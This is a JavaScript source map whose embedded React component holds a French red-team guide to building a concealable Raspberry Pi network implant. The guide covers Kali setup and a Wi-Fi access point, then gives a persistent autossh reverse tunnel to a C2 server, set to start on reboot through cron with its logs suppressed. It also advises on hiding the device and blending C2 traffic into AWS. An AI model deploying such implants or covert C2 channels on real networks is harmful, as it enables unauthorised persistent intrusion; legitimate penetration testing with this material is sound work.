AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,MAxCxI,2VA0C2U;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,MA1C3U,EA0CgV;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,MA1ChV,mTA4CwS;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,MA5CxS,EA4C6S;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,MA5C7S,yDAhNA,EAkQA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,oDAlQA,EAmQA;AAAG,MAAA,SAAS,EAAC,YAAb;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,8OACA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,MADA,EACK;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,MADL,6gBAnQA,EAwQA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,oFAxQA,EAyQA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,OACE;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,4CADF,EAEE;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,sBAFF,EAGE;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,8BAHF,CAzQA,EA+QA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,0CA/QA,EAgRA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,ydAhRA,CADF;AAwRD;;AA1RiC;;AA6RpC,eAAeE,OAAf","sourcesContent":["import React from 'react';\r\nimport Hide from \"../img/hide_raspberry.jpg\"\r\nimport KaliRaspberry from \"../img/kali_raspberry.png\"\r\n\r\n\r\nclass Redteam extends React.Component {\r\n    render() {\r\n      return (\r\n        <div className=\"article\">\r\n\r\n        <h1>Redteam</h1>\r\n   \r\n        <hr/>\r\n        <h2>Introduction</h2>\r\n        <h3>Contexte</h3>\r\n        <p className=\"tabulation\">L'objectif est de créer un implant qui une fois sur le réseau d'un client se reconnecterait automatiquement à notre serveur interne, avec à disposition toute la boite à outils de pentest.<br/><br/>  \r\n\r\n        Un scénario de Redteam serait de pénétrer dans une société cliente en étant déguisé, de placer l'implant sur le réseau, pour obtenir à distance un accès à leur réseau via une connexion OpenVPN ou un tunnel SSH inversé.<br/><br/>  \r\n\r\n        Des outils tels que tortle LAN existent déjà, mais l'idée serait d'avoir le contrôle total sur nos outils. Plusieurs méthodes doivent être implémentées au cas où le pare-feu du client bloquerait certains flux sortants. L'implant doit également avoir une méthode alternative pour se connecter au cas où leurs règles de pare-feu bloquerait le traffic, une configuration sans fil pour l'appareil est donc à envisager.\r\n        </p>\r\n\r\n        <img src={KaliRaspberry} style={{'width':'70%'}} alt=\"kali raspberry\"/>\r\n\r\n        <h3>Cahier des charges de la box</h3>\r\n        <div>\r\n        Plusieurs appareils peuvent convenir, les critères principaux étant la fiabilité, la légèreté, la taille,la rapidité et le coût:\r\n            <ul>\r\n                <li>l'appareil doit être <strong>petit</strong> (facile à dissimuler)</li>\r\n                <li>possibilité d'utiliser un <strong>tunnel SSH inverse persistant</strong> et/ou <strong>OpenVPN</strong> pour le Command&Control</li>\r\n                <li>espace de <strong>stockage</strong> (au moins 32 Go)</li>\r\n                <li>matériel <strong>rapide</strong></li>\r\n                <li><strong>faible coût</strong> (en cas de destruction ou de vol)</li>\r\n                <li>possibilité d'ajouter des modules pour la <strong>connexion sans fil</strong></li>\r\n            </ul>\r\n        Il existe de nombreux appareils comme le Hardkernel ODROID-N2, Beaglebone Black, mais pour le prix et le matériel, on préférera utiliser la <strong>Raspberry Pi 4.</strong></div>\r\n\r\n        <br/>\r\n\r\n        <h3>Shopping list pour le matériel</h3>\r\n        <div>\r\n          <ul>\r\n            <li><a href=\"https://www.canakit.com/raspberry-pi-4-starter-kit.html\">Raspberry Pi 4 Model B with 4GB RAM (Basic Kit) - $70</a></li>\r\n            <li><a href=\"https://www.amazon.com/dp/B07FCMBLV6\">SanDisk 64GB Extreme microSDXC UHS-I Memory Card - $15</a></li>\r\n            <li><a href=\"https://vilros.com/collections/raspberry-pi-accessories/products/vilros-raspberry-pi-4-compatible-clear-transparent-case-with-built-in-fan\">Raspberry Pi 4 Case with Fan - $12 (optional)</a></li>\r\n            <li><a href=\"https://www.amazon.com/gp/product/B01KWQAQ00/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&psc=1\">Wireless WiFi USB Dongle Stick Adapter RT5370 150Mbps - $9 (optional)</a></li>\r\n          </ul>\r\n        </div>\r\n\r\n        <br/>\r\n\r\n        <h3>Système d'exploitation</h3>\r\n        <p className=\"tabulation\">Pour le système d'exploitation (OS), la distribution <strong>Kali Linux</strong> sera retenue car elle possède déjà beaucoup d'outils de pentest, pas besoin d'installation et c'est facile pour tous les pentesters.</p>\r\n        \r\n        <br/>\r\n\r\n        <h3>Wifi</h3>\r\n        <p className=\"tabulation\">Le Raspberry Pi 4 dispose déjà d'une carte sans fil intégrée (sans fil 2,4 GHz et 5,0 GHz IEEE 802.11ac), et gère l'<strong>injection de paquets</strong> et <strong>le mode moniteur</strong> (contrairement à la Pi 3). Un autre adaptateur sans fil pourrait servir pour avoir une meilleure portée lors d'attaques sans fil.\r\n\r\n        Un adaptateur sans fil doté d'un chipset RT5370 pourrait être un bon choix, il prend en charge le mode moniteur, l'injection de paquets avec des outils comme Aireplay-ng et avait une plage décente. Ainsi on peut se connecter à un adaptateur via <strong>hostapd </strong>et utiliser l'autre adaptateur pour les attaques.</p>\r\n        \r\n        <br/>\r\n\r\n        <h3>Comment dissimuler la Raspberry ?</h3>\r\n\r\n        <img src={Hide} alt=\"idée pour chacher raspberry\"/>\r\n\r\n        <hr/>\r\n\r\n        <h2>Configuration initiale</h2>\r\n        <div>Les différentes étapes:\r\n          <ol>\r\n            <li>Configurer l'image Kali pour la carte MicroSD</li>\r\n            <li>Configurer un point d'accès WiFi avec hostapd</li>\r\n            <li>Configurer un tunnel SSH inverse automatique</li>\r\n            <li>Configurer le client et le serveur OpenVPN</li>\r\n          </ol>\r\n        </div>\r\n        <h3>Installation de Kali Linux</h3>\r\n        <a href=\"https://www.offensive-security.com/kali-linux-arm-images/#1493408272250-e17e9049-9ce8\">Kali Linux</a>\r\n\r\n        <br/>\r\n        <br/>\r\n\r\n        <div>\r\n          <h4>Pour Windows</h4>\r\n          Avec un adaptateur microSD vers USB et connectez la carte microSD à votre système Windows.<br/>\r\n          Décompressez l'archive.<br/>\r\n          Utilisez Win32DiskImager pour écrire l'image Kali sur la carte microSD.<br/>\r\n\r\n          <br/> \r\n\r\n          <h4>Pour Linux</h4>\r\n          Avec un adaptateur MicroSD vers USB et connectez la carte microSD au système Linux.<br/>\r\n          Utilisez la commande <strong>dd</strong> pour créer une image du fichier Kali sur la carte microSD.<br/>\r\n\r\n          <br/>\r\n\r\n          <h4>Installation</h4>\r\n          Connectez-vous à Kali Linux avec le nom d'utilisateur \"root\" et le mot de passe \"toor\".<br/>\r\n          Veillez à connecter un câble Ethernet sur la Raspberry Pi 4 pour l'accès internet, elle devrait automatiquement récupérer une adresse IP via DHCP.\r\n          \r\n        </div>\r\n\r\n        <br/>\r\n\r\n        <h4>Configurer un point d'accès wifi avec hostpad</h4>\r\n        <div id=\"wifi\">apt-get install hostapd <br/>\r\n        apt-get install pciutils<br/>\r\n\r\n        nano /etc/network/interfaces<br/><br/>\r\n        ##The /etc/network/interfaces file should look like the following:<br/>\r\n\r\n        auto lo<br/>\r\n        iface lo inet loopback<br/>\r\n        auto eth0<br/>\r\n        iface eth0 inet dhcp<br/>\r\n        auto wlan0<br/>\r\n        allow-hotplug wlan0<br/>\r\n        iface wlan0 inet static<br/>\r\n        address 172.16.66.1<br/>\r\n        netmask 255.255.255.0<br/>\r\n        gateway 172.16.66.1<br/>\r\n        \r\n        <br/>\r\n\r\n        ##Install a DHCP server that will serve WiFi clients:<br/><br/>\r\n\r\n        apt-get install udhcpd<br/>\r\n\r\n        nano /etc/udhcpd.conf<br/><br/>\r\n        ##Add the following to the end of the file:<br/><br/>\r\n\r\n        start           172.16.66.50<br/>\r\n        end             172.16.66.70<br/>\r\n        interface       wlan0<br/>\r\n        # Optional<br/>\r\n        opt     dns     1.1.1.1<br/>\r\n        option  subnet  255.255.255.0<br/>\r\n        opt     router  172.16.66.1<br/>\r\n        option  domain  local<br/>\r\n        <br/>\r\n        ##Create a file for udhcpd.leases:<br/><br/>\r\n\r\n        touch /var/lib/misc/udhcpd.leases<br/>\r\n        ##Edit the /etc/default/udhcpd file <br/>and change the DHCPD_ENABLED=”no” to “yes”:<br/><br/>\r\n\r\n        DHCPD_ENABLED=”yes”<br/>\r\n        ##Create the file /etc/hostapd/hostapd.conf<br/><br/>\r\n\r\n        nano /etc/hostapd/hostapd.conf<br/>\r\n        ##Copy the following into the hostapd.conf file :<br/><br/>\r\n\r\n        # Interface configuration<br/>\r\n        interface=wlan0<br/>\r\n        ssid=iphone10<br/>\r\n        channel=6<br/><br/>\r\n\r\n        # WPA Configuration<br/>\r\n        macaddr_acl=0<br/>\r\n        auth_algs=1<br/>\r\n        ignore_broadcast_ssid=0<br/>\r\n        wpa=2<br/>\r\n        wpa_passphrase=SuperSecretSquirrel<br/>\r\n        wpa_key_mgmt=WPA-PSK<br/>\r\n        rsn_pairwise=CCMP<br/>\r\n\r\n        #Hardware Configuration<br/>\r\n        driver=nl80211<br/>\r\n        ieee80211n=1<br/>\r\n        hw_mode=g<br/>\r\n        wmm_enabled=1<br/><br/>\r\n\r\n\r\n        nano /etc/init.d/hostapd<br/>\r\n        ##Change the line to the following:<br/><br/>\r\n\r\n        DAEMON_CONF=/etc/hostapd/hostapd.conf<br/><br/>\r\n\r\n        nano /etc/default/hostapd<br/>\r\n        ##Change the line to the following:<br/><br/>\r\n\r\n        DAEMON_CONF=\"/etc/hostapd/hostapd.conf\"\r\n\r\n        update-rc.d hostapd enable\r\n        ##Now, we need to enable IP forwarding in the kernel for forwarding packets for our client devices to the Internet:<br/><br/>\r\n\r\n        sysctl -w net.ipv4.ip_forward=1<br/><br/>\r\n\r\n        nano /etc/sysctl.conf<br/>\r\n        [Remove the “#” in front of net.ipv4.ip_forward=1]<br/><br/>\r\n\r\n        Finally, use your IPTables-magic to masquerade client connections to the Internet:<br/><br/>\r\n\r\n        iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE<br/>\r\n        There is a package available in Kali to make these changes to IPTables last.<br/><br/>\r\n\r\n        apt-get install iptables-persistent<br/>\r\n        iptables-save > /etc/iptables/rules.v4<br/><br/>\r\n        ##To ensure the iptables rules get loaded before the network interface at boot, we will create a short script in the /etc/network/if-pre-up.d/ directory:<br/><br/>\r\n\r\n        nano /etc/network/if-pre-up.d/iptables<br/>\r\n        Add the following code to the above /etc/network/if-pre-up.d/iptables file, then save:<br/><br/>\r\n\r\n        #!/bin/bash<br/>\r\n        /usr/sbin/iptables-restore {'<'} /etc/iptables/rules.v4<br/><br/>\r\n\r\n        chmod +x /etc/network/if-pre-up.d/iptables<br/>\r\n\r\n        reboot<br/>\r\n        ##You should now see a wireless network named “iphone10” (or whatever named you use)<br/> where you can connect to it with your wpa_passphrase you set earlier. You<br/> should also have Internet too assuming your Raspberry Pi 4 has Internet. Once<br/> connected, you can also SSH into your Raspberry Pi 4.\r\n        </div>\r\n\r\n        <h4>Configurer un tunnel reverse shell automatique</h4>\r\n        <p>Cette section suppose que vous disposez d'un serveur de commande et de contrôle accessible sur Internet et que le serveur a activé SSH</p>   \r\n\r\n        <div id=\"wifi\">\r\n        apt-get install autossh <br/>\r\n        ssh-keygen [Leave all of the settings default] <br/><br/>\r\n\r\n        scp /root/.ssh/id_rsa.pub root@[C2 IP Address]:/directory/on/C2<br/>\r\n\r\n\r\n        Append the contents of id_rsa.pub to ~/.ssh/authorized_keys or create this file on the C2 server:<br/>\r\n\r\n        [On the C2 server]\r\n\r\n        cat /directory/to/upload/to/id_rsa.pub >> ~/.ssh/authorized_keys<br/>\r\n\r\n        [On the RASPBERRY Pi 4]<br/>\r\n\r\n        ssh root@[C2 IP address]<br/>\r\n        Test “autossh”:<br/>\r\n\r\n        autossh -M 11166 -i /root/.ssh/id_rsa -R 6667:localhost:22 root@[C2 IP Address]<br/>\r\n        If you login to your VPS/C2 server, you should now see port 6667 present after you run a “netstat -antp” command.<br/>\r\n\r\n        To have the autossh start at boot, we will create a cronjob that points to a script. First we will create a bash script for our autossh file:<br/>\r\n\r\n        nano /bin/autossh-connect.sh<br/>\r\n        Then we place the autossh command inside the autossh-connect.sh file:<br/><br/>\r\n\r\n        #!/bin/bash<br/>\r\n        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Your C2 Server IP] &<br/><br/>\r\n\r\n        -N: Do not execute a command on the middleman machine<br/>\r\n        -f: Drop in the background<br/>\r\n        &: Execute this command but do not wait for output or an exit code. If this is not added, your machine might hang at boot<br/>\r\n\r\n        For the cronjob creation, type the following command:<br/>\r\n\r\n        crontab -e<br/>\r\n        At the bottom of the script (no “#” should be in front of what you are typing), add the following:<br/><br/>\r\n\r\n        @reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1<br/>\r\n        */5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1<br/>\r\n        This tells the cron job after reboot to wait 5 seconds and run the <br/>autossh-connect.sh script which will start the autossh process. <br/>\r\n        \r\n        The 5 seconds was added to ensure the network manager has started first. The “> /dev/null 2>&1” part ensures that no logs are written out to any files as to not take up space. On the second line, the cron job will also try and run every 5 minutes. This is due in case the autossh job gets disconnected or fails for whatever reason.<br/><br/>\r\n\r\n        That’s it. Now when your Raspberry Pi 4 starts, it should autossh to your C2 server which will create a local port of 6667 on the C2 server. When you SSH from your attacker system onto the C2 server, you can run the following command on your C2 server to get access to your Raspberry Pi 4 device:<br/><br/>\r\n\r\n        ssh localhost -p 6667 [This is ran on the C2 server]\r\n\r\n        </div>      \r\n        \r\n        <h4>Configurer un client et un serveur Openvpn</h4>\r\n        <p className=\"tabulation\">Bien que nous puissions faire un shell SSH inversé pour accéder à notre Raspberry, il serait également intéressant de configurer l'appareil pour utiliser une connexion OpenVPN inversée sur le port 443 (HTTPS). \r\n        <br/><br/>\r\n        Étant donné que la Raspberry sera probablement déposée à l'arrière d'un switch dans une entreprise, nous ne pourrons pas nous y connecter directement. Par conséquent, la Raspberry sortira d'abord via le port 443 vers notre serveur OpenVPN Access Server. Depuis notre box attaquant Kali, nous devrons également nous connecter au serveur VPN. Cela est une assurance du fait que si le client bloque le port 22 sortant pour SSH, nous aurons une autre option pour se connecter sur le port 443 (HTTPS).\r\n        </p>\r\n\r\n        <p>Il faut pour cela réaliser les 3 étapes suivantes de configuration :</p>\r\n        <ul>\r\n          <li>OpenVPN Access Server sur Internet</li>\r\n          <li>la Raspberry</li>\r\n          <li>La machine d'attaque</li>\r\n        </ul>\r\n\r\n        <h5>Configurer OpenVPN Access Server</h5>\r\n        <p>Pour la solution d'hébergement de notre serveur VPN on pourrait opter pour un serveur VPS car ils sont extrêmement faciles et rapides à configurer.\r\n\r\n        Vultr.com et Amazon Lightsail sont deux fournisseurs de VPS rapides, bon marché et simples à configurer. L'autre raison de choisir ces fournisseurs VPS est la détection du trafic, le réseau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet d'être plus discret. \r\n        </p>\r\n\r\n      </div>\r\n      );\r\n    }\r\n  }\r\n\r\n  export default Redteam;  "]},"metadata":{},"sourceType":"module"}